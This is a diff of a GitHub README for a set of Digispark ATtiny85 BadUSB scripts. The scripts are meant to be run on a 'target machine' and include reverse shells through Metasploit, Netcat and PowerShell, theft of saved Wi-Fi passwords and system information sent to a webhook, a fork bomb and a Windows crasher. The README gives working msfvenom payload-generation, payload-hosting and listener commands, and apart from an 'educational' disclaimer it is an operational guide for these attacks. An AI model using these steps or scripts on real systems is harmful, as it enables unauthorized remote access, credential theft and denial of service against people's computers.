@@ -1,239 +1,165 @@
-<h1 align="center">💀Digispark Attiny85 Scripts for Windows💀</h1>
+# 💀 Digispark Attiny85 Scripts for Windows 💀
 
-<br>
+## 📌 About This Repository
 
->
->This repository focuses on the storage of scripts for the digispark and for the dissemination of knowledge. I will update over time as I gain more experience! :)
->
+This repository is dedicated to storing scripts for the Digispark Attiny85 while promoting knowledge sharing. The scripts will be updated over time as I gain more experience! 😊
 
->
->Obs: These scripts are for educational purposes only. Use them at your own risk!
->
+⚠ **Disclaimer:** These scripts are for educational purposes only. Use them at your own risk!
 
->
->Works with Windows, Linux and Termux!
->
-
-<br>
+✅ Compatible with **Windows, Linux, and Termux!**
 
 <p align="center">
-	<img width="400" height="400" src="https://github.com/EndlssNightmare/Digispark-scripts/assets/110058202/7cf31e71-e6ac-4a74-ac69-3762e93ea66f">
+    <img width="400" height="400" src="https://github.com/EndlssNightmare/Digispark-scripts/assets/110058202/7cf31e71-e6ac-4a74-ac69-3762e93ea66f">
 </p>
 
-<br>
+---
 
-<h2 align="left"> Preview</h2>
+## 🚀 Available Scripts
 
- <br>
+- **Fakeupdate** 🃏 - Displays a fake Windows update screen.
+- **ForkBomb** 💥 - Creates an infinite loop, causing a system crash.
+- **Grab-WindowsSysinfo** 👽 - Collects system information.
+- **Metasploit-Revshell** 💔 - Reverse shell using Metasploit.
+- **Netcat-Revshell** 🐱 - Reverse shell using Netcat.
+- **Revshell-ps1** 🐀 - PowerShell-based reverse shell.
+- **Steal-Wifi-Passwd** 😈 - Extracts saved Wi-Fi passwords.
+- **Wallpaper-Prank** 😵 - Changes desktop wallpaper and hides icons.
+- **Windows-Crasher** 💥 - Creates a batch payload to crash Windows.
 
-* Fakeupdate :trollface:
-* ForkBomb :boom:
-* Grab-WindowsSysinfo :alien:
-* Metasploit-Revshell :broken_heart:
-* Netcat-Revshell :cat:
-* Revshell-ps1 :rat:
-* Steal-Wifi-Passwd :smiling_imp:
-* Wallpaper-Prank :dizzy_face:
-* Windows-Crasher :boom:
+---
 
-<br>
+## 🔧 Dependencies
 
-<body>
-   <h2 align="left"> Dependences</h2>
+To use these scripts, install the following:
 
-<br>
-	
-  >Digistump packages:<a href="https://github.com/digistump/DigistumpArduino"> DigistumpArduino</a>
-  >
-  >
-  >Digispark ABNT2:<a href="https://github.com/jcldf/digisparkABNT2" > DigisparkABNT2</a>
-  >
-  >
-  >Arduino IDE:<a href="https://www.arduino.cc/en/software"> ArduinoIDE</a>
-  >
-  >
-  >Metasploit Framework:<a href="https://www.metasploit.com"> Metasploit Framework</a>
+- **Digistump Packages:** [DigistumpArduino](https://github.com/digistump/DigistumpArduino)
+- **Digispark ABNT2:** [DigisparkABNT2](https://github.com/jcldf/digisparkABNT2)
+- **Arduino IDE:** [Download here](https://www.arduino.cc/en/software)
+- **Metasploit Framework:** [Metasploit Website](https://www.metasploit.com)
 
-  <br>
+---
 
-  <h2 align="left"> How to use</h2>
-<ol type="I">
+## 📖 How to Use
 
-  <br>
+### 🔹 Fakeupdate
 
-   <h4 align="left"><li>Fakeupdate</li></h4>
+This script opens a fake Windows update website in full screen.
 
-  <br>
+**Steps:**
+1. Upload the "Fakeupdate" script to Digispark.
+2. Run it on the target machine.
 
-  This Fakeupdate script opens a fake Windows update website and is configured to be full screen.
+---
 
-  <br>
+### 🔹 ForkBomb
 
-  **Upload the "Fakeupdate" script to digispark and run it on the target machine.**
+This script runs an infinite loop until the system crashes.
 
-  <br>
+**Steps:**
+1. Upload the "ForkBomb" script to Digispark.
+2. Run it on the target machine.
 
-   <h4 align="left"><li>ForkBomb</li></h4>
+---
 
-  <br>
+### 🔹 Grab-WindowsSysinfo
 
-  This Fork Bomb script will repeat itself until the pc freezes or crashes.
+This script extracts system information and sends it via a webhook.
 
-  <br>
+**Steps:**
+1. Replace the webhook URL in the script.
+2. Upload the "Grab-WindowsSysinfo" script to Digispark.
+3. Run it on the target machine.
 
-  **Upload the "Fork Bomb" script to digispark and run it.**
+---
 
-  <br>
+### 🔹 Metasploit-Revshell
 
-   <h4 align="left"><li>Grab-WindowsSysinfo</li></h4>
+This script creates a Metasploit reverse shell.
 
-  <br>
+**Steps:**
+1. Generate a payload:
+   ```bash
+   msfvenom --platform windows -p windows/meterpreter/reverse_tcp lhost=YOUR_IP lport=443 -e x86/shikata_ga_nai -i 7 -f exe -o exploit.exe
+   ```
+2. Edit `meta.rc` and start Metasploit:
+   ```bash
+   msfdb reinit && msfconsole -r meta.rc
+   ```
+3. Host the file:
+   ```bash
+   python3 -m http.server 80
+   ```
+4. Upload the "Metasploit-Revshell" script to Digispark and execute it.
 
-  Copy and pase your WebHook link on the digispark script.
+---
 
-  <br>
+### 🔹 Netcat-Revshell
 
-  **Upload the "Grab-WindowsSysinfo" script to digispark and run it on the target machine.**
+This script establishes a reverse shell using Netcat.
 
-  <br>
+**Steps:**
+1. Start an HTTP server:
+   ```bash
+   python3 -m http.server 80
+   ```
+2. Listen for the connection:
+   ```bash
+   nc -lvnp 443  # Or use ncat/pwncat-cs
+   ```
+3. Upload and run the "Netcat-Revshell" script.
 
-   <h4 align="left"><li>Metasploit-Revshell</li></h4>
+---
 
-  <br>
+### 🔹 Revshell-ps1
 
-  Create your own metasploitable file:
+This PowerShell script creates a reverse shell.
 
-  <br>
+**Steps:**
+1. Upload the .ps1 script to a secret GitHub Gist.
+2. Copy the raw link into the Arduino IDE.
+3. Listen for the connection:
+   ```bash
+   nc -lvnp 443  # Or use ncat/pwncat-cs
+   ```
+4. Upload and run the "Revshell-ps1" script.
 
-``` 
-msfvenom --platform windows -p windows/meterpreter/reverse_tcp lhost=YOURIP lport=443 -e x86/shikata_ga_nai -i 7 -f exe -o exploit.exe
-```
+---
 
- <br>
+### 🔹 Steal-Wifi-Passwd
 
-  Edit the meta.rc file and run the msfconsole:
+This script extracts saved Wi-Fi passwords and sends them via a webhook.
 
- <br>
+**Steps:**
+1. Replace the webhook URL in the script.
+2. Upload and run the "Steal-Wifi-Passwd" script.
 
-``` 
-msfdb reinit && msfconsole -r meta.rc
-```
+---
 
- <br>
+### 🔹 Wallpaper-Prank
 
-  Set your http request on the script (http://yourip/exploit.exe) and listen on your host:
+This script takes a screenshot of the desktop, sets it as the wallpaper, and hides icons.
 
- <br>
+**Steps:**
+1. Upload and run the "Wallpaper-Prank" script.
 
-``` 
-python3 -m http.server 80
-```
+---
 
- <br>
+### 🔹 Windows-Crasher
 
-  **Upload the "Metasploit-Revshell" script to digispark and run it on the target machine.**
+This script generates a batch file to crash Windows.
 
- <br>
+**Steps:**
+1. Upload and run the "Windows-Crasher" script.
 
-   <h4 align="left"><li>Netcat-Revshell</li></h4>
+---
 
- <br>
+## 🔗 References and Credits
 
-  Set your http server to download NetCat on victim's machine:
+- [CedArctic](https://github.com/CedArctic/DigiSpark-Scripts)
+- [Brunomlima](https://github.com/brunomlima/Digispark)
+- [Gadotti](https://github.com/Gadotti/DigisparkScripts)
 
- <br>
+---
 
-``` 
-python3 -m http.server 80
-```
+Enjoy experimenting responsibly! 😈
 
- <br>
-
-  Listen to the port:
-
- <br>
-
-``` 
-nc -lvnp 443 // ncat -lvnp 443 // pwncat-cs -lp 443
-```
-
- <br>
-
-**Upload the "Netcat-Revshell" script to digispark and run it on the target machine.**
-
- <br>
-
-   <h4 align="left"><li>Revshell-ps1</li></h4>
-
- <br>
-
-  Save the .ps1 script on your own secret gist repository, copy and paste the raw link on the Arduino IDE.
-
- <br>
-
-  Listen to the port:
-
- <br>
-
-``` 
-nc -lvnp 443 // ncat -lvnp 443 // pwncat-cs -lp 443
-```
-
- <br>
-
-**Upload the "Revshell-ps1" script to digispark and run it on the target machine.**
-
- <br>
-
-   <h4 align="left"><li>Steal-Wifi-Passwd</li></h4>
-
- <br>
-
-  Copy and pase your WebHook link on the digispark script.
-
- <br>
-
-  **Upload the "Steal-Wifi-Passwd" script to digispark and run it on the target machine.**
-
- <br>
-
-   <h4 align="left"><li>Wallpaper-Prank</li></h4>
-  
- <br>
-
-  This Wallpaper Prank script takes a picture of the desktop, saves it as the background and hides all the icons.
-
- <br>
-
-  **Upload the "Wallpaper-Prank" script to digispark and run it on the target machine.**
-
- <br>
-  
-   <h4 align="left"><li>Windows-Crasher</li></h4>
-  
- <br>
-
-  This Windows Crasher script creates a .bat payload on the temporary dir and crashes de Windows.
-
- <br>
-
-  **Upload the "Windows-Crasher" script to digispark and run it on the target machine.**
-
- <br>
-
-</ol>
-
-## References and Credits
-  
- <br>
-
-  ><a href="https://github.com/CedArctic/DigiSpark-Scripts"> CedArctic</a>
-  >
-  ><a href="https://github.com/brunomlima/Digispark"> Brunomlima</a>
-  >
-  ><a href="https://github.com/Gadotti/DigisparkScripts"> Gadotti</a>
-
- <br>
-
-</body>
-</html>
